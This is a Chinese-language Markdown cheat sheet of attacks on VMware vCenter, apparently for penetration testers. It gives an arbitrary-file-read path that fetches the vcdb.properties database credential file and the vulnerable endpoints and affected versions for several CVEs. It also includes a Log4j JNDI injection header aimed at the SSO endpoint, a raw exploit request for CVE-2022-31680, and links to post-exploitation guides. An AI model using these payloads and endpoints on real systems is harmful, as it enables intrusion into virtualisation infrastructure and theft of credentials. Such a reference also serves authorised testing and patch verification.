# vcenter

### 版本查看

```
/sdk/vimServiceVersions.xml
```

### VMware vCenter Server 任意文件读取漏洞

[VMware vCenter Server 任意文件读取漏洞](https://forum.90sec.com/t/topic/1582)

endpoint
```
/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
```

### CVE-2021-21972

[VMware vCenter RCE 漏洞踩坑实录——一个简单的RCE漏洞到底能挖出什么知识](https://mp.weixin.qq.com/s/eamNsLY0uKHXtUw_fiUYxQ)

[CVE-2021-21972 vCenter Server 文件写入漏洞分析](https://blog.noah.360.net/vcenter-6-5-7-0-rce-lou-dong-fen-xi/)

```
VMware vCenter Server 7.0系列 < 7.0.U1c
VMware vCenter Server 6.7系列 < 6.7.U3l
VMware vCenter Server 6.5系列 < 6.5 U3n
VMware ESXi 7.0系列 < ESXi70U1c-17325551
VMware ESXi 6.7系列 < ESXi670-202102401-SG
VMware ESXi 6.5系列 < ESXi650-202102101-SG
```

endpoint 

```
/ui/vropspluginui/rest/services/uploadova
```

### CVE-2021-21985

[CVE-2021-21985 VMware vCenter Server远程代码执行漏洞分析](https://www.ghtwf01.cn/2022/07/31/CVE-2021-21985%20VMware%20vCenter%20Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)

```
VMware vCenter Server 7.0系列 < 7.0.U2b
VMware vCenter Server 6.7系列 < 6.7.U3n
VMware vCenter Server 6.5系列 < 6.5 U3p
VMware Cloud Foundation 4.x 系列 < 4.2.1
VMware Cloud Foundation 4.x 系列 < 3.10.2.1
```

### CVE-2021-22005

[vCenter RCE 详细分析过程 (CVE-2021–22005)](https://cloud.tencent.com/developer/article/1887641)

```
VMware vCenter Server 7.0
VMware vCenter Server 6.7 Running On Virtual Appliance
VMware Cloud Foundation (vCenter Server) 4.x
VMware Cloud Foundation (vCenter Server) 3.x
```

### Log4j

endpoint

```
/websso/SAML2/SSO/vsphere.local?SAMLRequest=

X-Forwarded-For: ${jndi:ldap://exp}
```



### CVE-2022-31680

[CVE-2022-31680](https://talosintelligence.com/vulnerability_reports/TALOS-2022-1587)

```
GET /psc/data/constraint/amJzMXszAAAAATMAAAACAAAIRW1wbG95ZWUAASL6C7Hsp5eXAAKXEjO-44rgaCk1FZKH_mF7AQQAAAADAAAGTWFyY2luAAB6aQ HTTP/1.1
Host: 192.168.0.109
Cookie: JSESSIONID=D8E403940B6B595FF53158ED63671A69; XSRF-TOKEN=b28efbac-6d3c-4fcb-b177-baee9c1e005e; VSPHERE-USERNAME=Administrator%40VSPHERE.LOCAL; VSPHERE-CLIENT-SESSION-INDEX=_87577cc1f7ac5bba20fe8d947d9ffcfe
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: application/json, text/plain, */*
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Pragma: no-cache
Isangularrequest: true
X-Xsrf-Token: b28efbac-6d3c-4fcb-b177-baee9c1e005e
Referer: https://192.168.0.109/psc/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
```

### 后续利用

[VMware vCenter漏洞实战利用总结](https://mp.weixin.qq.com/s/0gg5TDEtL3lCb9pOnm42gg)

[Vcenter实战利用方式总结](https://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247499057&idx=1&sn=24ce83c75152529f2b8ef8543162a734&chksm=cfa55922f8d2d0349b97211fdf45df6c78b26ace580b68579817ed67760aaface17348529cf3&mpshare=1&scene=23&srcid=10245pAGxEFHmXFGCMoKjGdB&sharer_sharetime=1666572610152&sharer_shareid=33fdea7abe6be586e131951d667ccd06#rd)
